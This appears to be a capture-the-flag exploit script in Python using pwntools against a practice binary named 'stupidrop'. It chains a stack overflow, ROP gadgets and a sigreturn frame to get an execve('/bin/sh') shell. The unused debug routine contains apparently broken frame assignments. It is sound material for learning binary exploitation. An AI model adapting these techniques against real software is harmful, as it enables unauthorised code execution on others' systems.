#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-08-02 15:34:49
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *
from pwn import p64

context.arch = "amd64"

filename = "./stupidrop"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    # fill buffer to saved ret address
    trash = cyclic(0x38)

    # gadgets
    # pop rdi; ret
    pop_rdi = p64(0x4006a3)
    # pop rsi, pop r15, ret
    pop_rsi = p64(0x4006a1)
    writable_bss = p64(0x601050)
    gets_address = p64(binary_target.symbols['gets'])
    alarm_address = p64(binary_target.symbols['alarm'])
    syscall_address = p64(0x40063e)
    execve_syscall = p64(0x3b)
    sig_ret_syscall = p64(0xf)
    
    def exploit_no_srop():
        # rop chain
        # use existing gets function to write
        # '/bin/sh' to bss
        my_rop = pop_rdi
        my_rop += writable_bss
        my_rop += gets_address

        # use alarm to put syscall number in rax
        my_rop += pop_rdi
        my_rop += execve_syscall
        my_rop += alarm_address
        my_rop += pop_rdi
        my_rop += p64(0x0)
        my_rop += alarm_address
        
        # make the syscall, at this point rax should
        # already be set to the syscall number
        my_rop += pop_rdi
        my_rop += writable_bss
        my_rop += pop_rsi
        my_rop += p64(0x0)
        my_rop += p64(0x0)
        my_rop += syscall_address

        target_process.sendline(trash + my_rop)
        target_process.sendline(b'/bin/sh\x00')
        target_process.interactive()

    def exploit_srop():
        # rop chain
        # use existing gets function to write
        # '/bin/sh' to bss
        my_rop = pop_rdi
        my_rop += writable_bss
        my_rop += gets_address

        # use alarm to put syscall number in rax
        my_rop += pop_rdi
        my_rop += sig_ret_syscall
        my_rop += alarm_address
        my_rop += pop_rdi
        my_rop += p64(0x0)
        my_rop += alarm_address

        # make sigreturn syscall
        my_rop += syscall_address

        sig_ret_frame = SigreturnFrame()
        sig_ret_frame.rax = 0x3b
        sig_ret_frame.rdx = 0x0
        sig_ret_frame.rsi = 0x0
        sig_ret_frame.rdi = 0x601050
        sig_ret_frame.rip = 0x40063e

        sig_ret_bytes = bytes(sig_ret_frame)

        my_rop += sig_ret_bytes

        target_process.sendline(trash + my_rop)
        pause()
        target_process.sendline(b'/bin/sh\x00')
        target_process.interactive()
    
    exploit_srop()


def debug():
    script = "break *0x40063c"
    gdb.attach(target_process, gdbscript=script)

    # fill buffer to saved ret address
    trash = cyclic(0x38)

    # gadgets
    # pop rdi; ret
    pop_rdi = p64(0x4006a3)
    # pop rsi, pop r15, ret
    pop_rsi = p64(0x4006a1)
    writable_bss = p64(0x601050)
    gets_address = p64(binary_target.symbols['gets'])
    alarm_address = p64(binary_target.symbols['alarm'])
    syscall_address = p64(0x40063e)
    execve_syscall = p64(0x3b)
    sig_ret_syscall = p64(0xf)
    
    # rop chain
    # use existing gets function to write
    # '/bin/sh' to bss
    my_rop = pop_rdi
    my_rop += writable_bss
    my_rop += gets_address

    # use alarm to put syscall number in rax
    my_rop += pop_rdi
    # my_rop += execve_syscall
    my_rop += sig_ret_syscall
    my_rop += alarm_address
    my_rop += pop_rdi
    my_rop += p64(0x0)
    my_rop += alarm_address

    sig_ret_frame = SigreturnFrame()
    sig_ret_frame.rax = 0x3b
    sig_ret_frame.rdx = 0x0
    sig_ret_frame.rsi = 0x0
    sig_ret_frame.rdi = writable_bss
    sig_ret_frame.rip = syscall_address

    sig_ret_bytes = bytes(sig_ret_frame)
    my_rop += sig_ret_bytes
    
    # make the syscall, at this point rax should
    # already be set to the syscall number
    # my_rop += pop_rdi
    # my_rop += writable_bss
    # my_rop += pop_rsi
    # my_rop += p64(0x0)
    # my_rop += p64(0x0)
    # my_rop += syscall_address

    pause()
    my_sendline(trash + my_rop)
    
    pause()
    my_sendline(b'/bin/sh\x00')
    target_process.interactive()


def my_sendline(data) -> None:
    target_process.sendline(data)


if __name__ == "__main__":
    # debug()
    # solve()
    exploit()


